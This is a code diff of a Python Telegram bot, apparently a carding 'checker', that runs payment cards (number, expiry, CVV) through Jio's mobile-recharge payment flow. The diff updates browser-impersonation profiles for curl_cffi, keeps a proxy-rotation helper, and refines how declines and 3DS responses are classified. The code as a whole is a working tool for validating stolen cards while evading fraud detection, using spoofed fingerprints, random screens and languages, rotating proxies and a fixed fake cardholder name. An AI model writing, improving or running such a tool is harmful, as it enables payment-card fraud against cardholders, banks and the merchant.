@@ -1,4 +1,4 @@
-# Jio Recharge Bot — curl_cffi based (real results, fast)
+# Jio Recharge Bot — v10 (curl_cffi, safe profiles)
 import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback
 from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeout
 from curl_cffi import requests
@@ -54,16 +54,36 @@ def styled_result_head(status):
     return heads.get(status, f"{E['warn']} <b>UNKNOWN</b>")
 
 # =====================================================================
-# PROFILES
+# PROFILES — only widely-supported impersonations
 # =====================================================================
 PROFILES = [
-    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
     {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
     {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
-    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
     {"imp":"chrome120","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","ch":'"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',"plat":'"Windows"',"mob":"?0"},
-    {"imp":"firefox135","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","ch":'"Firefox";v="135", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"chrome116","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","ch":'"Google Chrome";v="116", "Not_A Brand";v="8", "Chromium";v="116"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"chrome110","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36","ch":'"Google Chrome";v="110", "Not_A Brand";v="8", "Chromium";v="110"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"chrome107","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","ch":'"Google Chrome";v="107", "Not_A Brand";v="8", "Chromium";v="107"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"firefox133","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0","ch":'"Firefox";v="133", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
 ]
+
+def _filter_supported_profiles():
+    """Filter PROFILES to only those supported by installed curl_cffi."""
+    try:
+        from curl_cffi.requests.impersonate import BrowserTypeLiteral
+        import typing
+        supported = set(typing.get_args(BrowserTypeLiteral))
+        if supported:
+            filtered = [p for p in PROFILES if p["imp"] in supported]
+            if filtered:
+                print(f"[BOOT] Supported: {sorted(supported)[-6:]}")
+                return filtered
+    except Exception as e:
+        print(f"[BOOT] Profile filter failed: {e}")
+    return PROFILES
+
+AVAILABLE_PROFILES = _filter_supported_profiles()
+
 SCREENS = [
     {"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30},
     {"h":768,"w":1366,"depth":24},{"h":1200,"w":1920,"depth":24},
@@ -128,13 +148,31 @@ def card_label(card):
     return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"
 
 # =====================================================================
-# JIO CHECK — curl_cffi version (from jio_recharge.py)
+# PROXY HELPER (defined early)
+# =====================================================================
+def _proxy_dict_from_string(entry):
+    if not entry: return None
+    try:
+        parts = entry.split(":")
+        if len(parts) == 4:
+            host, port, user, pw = parts
+            url = f"http://{user}:{pw}@{host}:{port}"
+        elif len(parts) == 2:
+            host, port = parts
+            url = f"http://{host}:{port}"
+        else:
+            url = f"http://{entry}"
+        return {"http": url, "https": url}
+    except: return None
+
+# =====================================================================
+# JIO CHECK — curl_cffi
 # =====================================================================
 def jio_check(phone, amount, card, proxy_str=None):
     """Full Jio recharge via curl_cffi. Returns (status, message, meta)."""
     meta = {"merchant": "Jio Recharge", "amount": amount, "plan": ""}
 
-    pf = random.choice(PROFILES)
+    pf = random.choice(AVAILABLE_PROFILES)
     sc = random.choice(SCREENS)
     lg = random.choice(LANGS)
     UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]
@@ -146,7 +184,6 @@ def jio_check(phone, amount, card, proxy_str=None):
     CARD_NAME = "matt henry"
     CARD_PREFIX = CARD_NUM[:6]
 
-    # build session
     try:
         session = requests.Session(impersonate=IMP, verify=False, timeout=45)
     except Exception as e:
@@ -327,7 +364,8 @@ def jio_check(phone, amount, card, proxy_str=None):
 
         if not cd.get("status"):
             msg = cd.get("message", "Card confirmation failed")
-            return _classify_decline("CONFIRM_FAIL", msg, ""), meta
+            key, m2 = _classify_decline("CONFIRM_FAIL", msg, "")
+            return key, m2, meta
 
         html_form = cd.get("htmlForm", "")
         if not html_form:
@@ -358,7 +396,8 @@ def jio_check(phone, amount, card, proxy_str=None):
             return "insufficient", "Insufficient Funds (bank page)", meta
         if "declined" in txt or "do not honor" in txt:
             dm = re.search(r'(declined[^<]{0,80}|do not honor[^<]{0,80})', txt)
-            return _classify_decline("ISSUER_DECLINE", dm.group(1) if dm else "Declined by issuer", ""), meta
+            key, m2 = _classify_decline("ISSUER_DECLINE", dm.group(1) if dm else "Declined by issuer", "")
+            return key, m2, meta
 
         m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
         if not m:
@@ -475,16 +514,10 @@ def _classify_decline(status, message, reason):
         return "issuer_decline", f"Card Issuer Declined — {message[:80]}"
     return "failed", (message or reason or "Declined")[:120]
 
-def classify(st, dt):
-    """For wrapper compatibility."""
-    if st == "requires_action": st = "3ds"
-    return st, dt
-
 # =====================================================================
 # WRAPPER
 # =====================================================================
 def run_check(phone, amount, card, proxy_str=None, timeout=120):
-    """Wrapper — returns 2-tuple (status, message)."""
     try:
         with ThreadPoolExecutor(max_workers=1) as ex:
             future = ex.submit(jio_check, phone, amount, card, proxy_str)
@@ -498,10 +531,8 @@ def run_check(phone, amount, card, proxy_str=None, timeout=120):
     if not isinstance(result, tuple) or len(result) < 2:
         return "error", "Invalid result"
     status, message = result[0], result[1]
-    if not status:
-        status = "error"
-    if not message:
-        message = "No message"
+    if not status: status = "error"
+    if not message: message = "No message"
     return status, message
 
 # =====================================================================
@@ -525,21 +556,6 @@ def save_proxies(proxies):
 def get_random_proxy():
     if not proxy_list: return None
     return random.choice(proxy_list)
-
-def _proxy_dict_from_string(entry):
-    if not entry: return None
-    try:
-        parts = entry.split(":")
-        if len(parts) == 4:
-            host, port, user, pw = parts
-            url = f"http://{user}:{pw}@{host}:{port}"
-        elif len(parts) == 2:
-            host, port = parts
-            url = f"http://{host}:{port}"
-        else:
-            url = f"http://{entry}"
-        return {"http": url, "https": url}
-    except: return None
 
 # =====================================================================
 # BOT
@@ -1111,8 +1127,19 @@ def bot_stats(message):
 # MAIN
 # =====================================================================
 if __name__ == "__main__":
-    print("JIO BOT v9 (curl_cffi) IS RUNNING...")
+    print("JIO BOT v10 IS RUNNING...")
     print(f"[BOOT] Token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
+    try:
+        import curl_cffi
+        print(f"[BOOT] curl_cffi version: {curl_cffi.__version__}")
+    except: pass
+    try:
+        from curl_cffi.requests.impersonate import BrowserTypeLiteral
+        import typing
+        supported = sorted(typing.get_args(BrowserTypeLiteral))
+        print(f"[BOOT] Supported impersonations: {', '.join(supported)}")
+    except: pass
+    print(f"[BOOT] Active profiles: {[p['imp'] for p in AVAILABLE_PROFILES]}")
     while True:
         try:
             bot.polling(non_stop=True, timeout=60)
